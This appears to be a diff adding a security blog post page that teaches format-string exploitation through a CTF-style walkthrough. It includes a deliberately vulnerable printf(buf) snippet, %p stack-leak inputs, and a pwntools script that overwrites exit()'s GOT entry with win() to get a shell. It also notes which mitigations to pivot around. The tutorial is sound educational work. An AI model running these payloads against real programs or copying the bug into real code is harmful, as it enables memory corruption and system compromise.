@@ -1,0 +1,179 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>printf is a write primitive — algoatson.github.io</title>
+<meta name="description" content="A single missing &quot;%s&quot; turns printf into a read-anywhere and write-anywhere primitive. Walk the whole ladder — leak the stack with %p, find your own offset, then bend %n into an arbitrary write — and the mitigations that make it harder but rarely impossible.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/printf-is-a-write-primitive/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="printf is a write primitive — algoatson.github.io">
+<meta property="og:description" content="A single missing &quot;%s&quot; turns printf into a read-anywhere and write-anywhere primitive. Walk the whole ladder — leak the stack with %p, find your own offset, then bend %n into an arbitrary write — and the mitigations that make it harder but rarely impossible.">
+<meta property="og:url" content="https://algoatson.github.io/p/printf-is-a-write-primitive/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/printf-is-a-write-primitive.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "printf is a write primitive", "datePublished": "2026-02-22", "dateModified": "2026-02-22", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "A single missing \"%s\" turns printf into a read-anywhere and write-anywhere primitive. Walk the whole ladder — leak the stack with %p, find your own offset, then bend %n into an arbitrary write — and the mitigations that make it harder but rarely impossible.", "url": "https://algoatson.github.io/p/printf-is-a-write-primitive/", "mainEntityOfPage": "https://algoatson.github.io/p/printf-is-a-write-primitive/", "keywords": "pwn, fmtstr, ctf"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>printf is a write primitive</h1>
+  <div class="meta"><span>2026-02-22</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/fmtstr/">fmtstr</a> <a class="tag" href="/tags/ctf/">ctf</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#step-1-read-the-stack-with-p">step 1 — read the stack with %p</a></li>
+<li><a href="#step-2-n-the-write">step 2 — %n, the write</a></li>
+<li><a href="#what-the-mitigations-actually-do">what the mitigations actually do</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>The bug is one character of carelessness:</p>
+<figure class="codeblock"><figcaption><span class="fname">vuln.c</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#vulnc-1">1</a></span>
+<span class="normal"><a href="#vulnc-2">2</a></span>
+<span class="normal"><a href="#vulnc-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="vulnc-1"><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span><span id="vulnc-2"><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+</span><span id="vulnc-3"><span class="hll"><span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w">              </span><span class="c1">// should be printf(&quot;%s&quot;, buf)</span>
+</span></span></code></pre></div></td></tr></table></div>
+</figure>
+<p><code class="highlight">printf</code> walks its format string looking for conversions, and pulls each
+argument from where the calling convention says the <em>next</em> argument should be —
+registers, then the stack. But you only passed one argument. So every <code class="highlight">%p</code>,
+<code class="highlight">%x</code>, <code class="highlight">%n</code> you smuggle in reads (or writes) memory that was never meant to be an
+argument at all. That's not a info-leak <em>or</em> a write bug; it's both.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./fmt</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div></dl><ul class="target__mits"><li class="m-meh"><span class="g" aria-hidden="true">≈</span><span class="mk">RELRO</span><span class="lead" aria-hidden="true"></span><span class="mv">partial</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">canary</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">NX</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-off"><span class="g" aria-hidden="true">✗</span><span class="mk">PIE</span><span class="lead" aria-hidden="true"></span><span class="mv">off</span></li></ul></div></figure>
+<h2 id="step-1-read-the-stack-with-p">step 1 — read the stack with %p<a class="headerlink" href="#step-1-read-the-stack-with-p" title="Permanent link">#</a></h2>
+<p>On x86-64 the first arguments live in registers: the format string is in <code class="highlight">rdi</code>,
+then <code class="highlight">rsi rdx rcx r8 r9</code> would hold conversions 1–5, and conversion 6 onward
+comes off the stack. So <code class="highlight">%6$p</code> prints the first stack quadword, <code class="highlight">%7$p</code> the next,
+and so on — <code class="highlight">%N$</code> is <em>direct parameter access</em>, no need to walk every slot:</p>
+<figure class="codeblock"><figcaption><span class="fname">leaking the stack</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#leaking-the-stack-1">1</a></span>
+<span class="normal"><a href="#leaking-the-stack-2">2</a></span>
+<span class="normal"><a href="#leaking-the-stack-3">3</a></span>
+<span class="normal"><a href="#leaking-the-stack-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="leaking-the-stack-1">$ ./fmt
+</span><span id="leaking-the-stack-2">%6$p.%7$p.%8$p.%9$p.%10$p
+</span><span id="leaking-the-stack-3">0x7ffd...8a0.0x55...169.0x7f...d90.0x4141414141414141.0x...
+</span><span id="leaking-the-stack-4">                                   ^^ that&#39;s our own &quot;AAAAAAAA&quot; input
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Spray <code class="highlight">%p</code>s, find the one that prints your own bytes, and you've learned <strong>your
+input's offset</strong> — the number you'll aim <code class="highlight">%n</code> through later. The other leaks are
+gifts: a <code class="highlight">0x55…</code>/<code class="highlight">0x56…</code> value is a PIE/code pointer, <code class="highlight">0x7f…</code> is libc or the
+stack. One format string, and ASLR is usually gone.</p>
+<div class="admonition tip">
+<p class="admonition-title">find the offset without counting</p>
+<p>Send <code class="highlight">AAAAAAAA%6$p%7$p%8$p…</code> and look for <code class="highlight">0x4141414141414141</code> in the output.
+The position where it appears <em>is</em> the offset to the start of your buffer.
+pwntools' <code class="highlight">FmtStr</code> autodetects it for you, but do it by hand once.</p>
+</div>
+<h2 id="step-2-n-the-write">step 2 — %n, the write<a class="headerlink" href="#step-2-n-the-write" title="Permanent link">#</a></h2>
+<p><code class="highlight">%n</code> is the conversion everyone forgets exists: it writes the <strong>number of bytes
+printed so far</strong> to the <code class="highlight">int *</code> argument. Its cousins write narrower: <code class="highlight">%hn</code> a
+<code class="highlight">short</code>, <code class="highlight">%hhn</code> a single byte. So to write a value you <em>control the count</em> — print
+exactly that many characters, then fire <code class="highlight">%n</code> at a pointer you placed in the
+argument area.</p>
+<p>Writing a full 8-byte address with one <code class="highlight">%n</code> would mean printing billions of
+chars, so you split it into byte-sized writes with <code class="highlight">%hhn</code> and width specifiers,
+writing each target byte by padding to the right cumulative count:</p>
+<div class="math math-block"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow><msub><mtext>pad</mtext><mi>i</mi></msub><mo>&#x0003D;</mo><mo stretchy="false">&#x00028;</mo><msub><mtext>target&#x000A0;byte</mtext><mi>i</mi></msub><mo>&#x02212;</mo><mtext>printed&#x000A0;so&#x000A0;far</mtext><mo stretchy="false">&#x00029;</mo><mo>mod</mo><mn>256</mn></mrow></math></div>
+<p>Hand-assembling that is miserable, so let pwntools compute it — give it the
+offset from step 1 and an <code class="highlight">{address: value}</code> map:</p>
+<figure class="codeblock"><figcaption><span class="fname">solve.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#solvepy-1">1</a></span>
+<span class="normal"><a href="#solvepy-2">2</a></span>
+<span class="normal"><a href="#solvepy-3">3</a></span>
+<span class="normal"><a href="#solvepy-4">4</a></span>
+<span class="normal"><a href="#solvepy-5">5</a></span>
+<span class="normal"><a href="#solvepy-6">6</a></span>
+<span class="normal"><a href="#solvepy-7">7</a></span>
+<span class="normal"><a href="#solvepy-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="solvepy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="solvepy-2"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./fmt&quot;</span><span class="p">)</span>
+</span><span id="solvepy-3"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./fmt&quot;</span><span class="p">)</span>
+</span><span id="solvepy-4">
+</span><span id="solvepy-5"><span class="hll"><span class="c1"># overwrite the GOT entry for exit() with win()  (Partial RELRO -&gt; GOT writable)</span>
+</span></span><span id="solvepy-6"><span class="hll"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;exit&quot;</span><span class="p">]:</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;win&quot;</span><span class="p">]})</span>
+</span></span><span id="solvepy-7"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="solvepy-8"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>                 <span class="c1"># exit() now calls win()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>the flag</summary>
+<p><code class="highlight">exit()</code>'s GOT slot now points at <code class="highlight">win()</code>, so the program's own clean-up hands
+you the shell:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{n0_f0rm4t_n0_party}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="what-the-mitigations-actually-do">what the mitigations actually do<a class="headerlink" href="#what-the-mitigations-actually-do" title="Permanent link">#</a></h2>
+<ul>
+<li><strong>Partial RELRO</strong> (above) leaves the <strong>GOT writable</strong> — the easy target. <strong>Full
+  RELRO</strong> resolves and read-onlys the GOT at load, so you pivot to a <em>writable</em>
+  function pointer instead: a saved return address, <code class="highlight">__free_hook</code>/<code class="highlight">__malloc_hook</code>
+  (pre-2.34), <code class="highlight">_IO_2_1_stdout_</code>'s vtable, or <code class="highlight">__exit_funcs</code>.</li>
+<li><strong><code class="highlight">FORTIFY_SOURCE</code></strong> rewrites <code class="highlight">printf</code> to <code class="highlight">__printf_chk</code>, which <strong>rejects <code class="highlight">%n</code> in
+  a writable format string</strong> and requires positional args to be contiguous. It's a
+  real speed-bump — but a <em>read-only</em> format string with <code class="highlight">%n</code> (rare) or a different
+  sink slips it.</li>
+<li><strong>Canary / PIE / NX</strong> don't touch this bug at all; the format string <em>leaks</em>
+  exactly the canary and PIE base you'd otherwise be missing. That's the cruel
+  part — a format string is frequently the leak that arms a <em>different</em> overflow.</li>
+</ul>
+<p>The lesson that sticks: <code class="highlight">printf(user_input)</code> isn't a logging bug, it's a
+<strong>read-anywhere + write-anywhere</strong> primitive handed to you in one line. Treat
+every uncontrolled format string as full compromise until proven otherwise.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-05-26</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/pwntools-cookbook/">a pwntools cookbook</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-05-19</span><a class="row__tag" href="/tags/tooling/">tooling</a><a class="row__title" href="/p/checksec-everything/">one keybind to checksec everything</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-04-30</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/seccomp-jails-and-their-holes/">seccomp jails, and the holes in them</a><span class="row__min">3 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/the-stack-canary-from-the-source/"><span class="lbl">&#8249; newer</span>the stack canary, from the source</a><a class="next" href="/p/slab-uaf-modprobe/"><span class="lbl">older &#8250;</span>a slab use-after-free, from ioctl to root</a></nav></main>
+
+    <footer class="status">
+      <span>32 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
